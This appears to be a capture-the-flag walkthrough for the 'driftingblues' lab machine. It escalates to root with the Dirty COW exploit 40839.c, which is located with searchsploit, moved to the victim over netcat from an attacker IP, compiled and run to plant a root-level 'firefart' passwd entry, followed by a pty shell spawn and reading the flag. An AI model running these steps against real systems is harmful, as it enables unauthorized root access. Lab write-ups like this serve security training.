<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Get Privilege user (Flag)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">Get Privilege user (Flag)</h1><br/><br />1. Look for an user in “/etc/passwd” on the victim's machine.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>etc<span style="color:#a52a2a;font-weight:700">/passwd</span></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-1.png" alt="images/860-1.png" /><br /><br />    As you can see there's not any user.<br /><br />2. Look at the victim's system properties.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$uname</span>&nbsp;-a</div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-2.png" alt="images/860-2.png" /><br /><br />    You can see<br />    • <code>Linux</code> - Kernel name.<br />    • <code>3.2.0-4-amd64</code> Kernel release.<br /><br />3. Search for a Linux Kernel exploit on your Kali Machine.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$searchsploit</span>&nbsp;linux&nbsp;kernel<br /></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-3.png" alt="images/860-3.png" /><br /><br />   •  This exploit uses the pokemon exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line. <br />   •  The user will be prompted for the new password when the binary is run.<br />   •  The original /etc/passwd file is then backed up to /tmp/passwd.bak and overwrites the root account with the generated line.<br />   •  After running the exploit you should be able to login with the newly created user.<br /><br />    More info <a href="https://www.exploit-db.com/exploits/40839">here</a>.<br /><br />4. Copy the “40839.c” file to the victim's machine “/tmp” directory.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$locate</span>&nbsp;40839.c<br /></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-4.png" alt="images/860-4.png" /><br /><br />    On your Kali Machine run the following code.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$nc</span>&nbsp;-l&nbsp;-p&nbsp;4444&nbsp;&lt;&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>usr<span style="color:#a52a2a;font-weight:700">/</span>share<span style="color:#a52a2a;font-weight:700">/</span>exploitdb<span style="color:#a52a2a;font-weight:700">/</span>exploits<span style="color:#a52a2a;font-weight:700">/</span>linux<span style="color:#a52a2a;font-weight:700">/</span>local<span style="color:#a52a2a;font-weight:700">/</span>40839.c</div></div><br />   <br />    On your victim's machine run the following code.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$nc</span>&nbsp;-w&nbsp;3&nbsp;192.168.12.10&nbsp;4444&nbsp;<span style="color:#a52a2a;font-weight:700">|</span>&nbsp;pv&nbsp;&gt;&nbsp;40839.c</div></div> <br /><br />5. Compile the “40839.c” file on the reverse shell and run it.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$gcc</span>&nbsp;-o&nbsp;expl&nbsp;-pthread&nbsp;-lcrypt&nbsp;40839.c<br />$.<span style="color:#a52a2a;font-weight:700">/</span>expl&nbsp;newpas</div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-5.png" alt="images/860-5.png" /><br /><br />6. Check the “/etc/passwd” for a new user “firfart”.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>etc<span style="color:#a52a2a;font-weight:700">/passwd</span></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-6.png" alt="images/860-6.png" /><br /><br />7. Pawn a shell.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$python</span>&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'import&nbsp;pty;&nbsp;pty.spawn("/bin/sh")'</span></div></div><br /><br />8. Change user. Password: newpas<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$su</span>&nbsp;firefart</div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-7.png" alt="images/860-7.png" /><br /><br />9. Find out user and group names and numeric ID’s (UID or group ID) of the current user.<br />    <div class="codebox"><div class="codebox">firefart@driftingblues<span style="color:#a52a2a;font-weight:700">:/</span>#<span style="color:#a52a2a;font-weight:700">id</span></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-8.png" alt="images/860-8.png" /><br />    <br />    This user has root privileges.<br /><br />10. Go to “root” directory and list the files.<br />    <div class="codebox"><div class="codebox">firefart@driftingblues<span style="color:#a52a2a;font-weight:700">:/</span>#cd&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>root<br />firefart@driftingblues<span style="color:#a52a2a;font-weight:700">:/</span>#<span style="color:#a52a2a;font-weight:700">ls</span></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-9.png" alt="images/860-9.png" /><br /><br />11. Show the flag.<br />    <div class="codebox"><div class="codebox">firefart@driftingblues<span style="color:#a52a2a;font-weight:700">:/</span>#<span style="color:#a52a2a;font-weight:700">cat</span>&nbsp;</div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/860-10.png" alt="images/860-10.png" /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>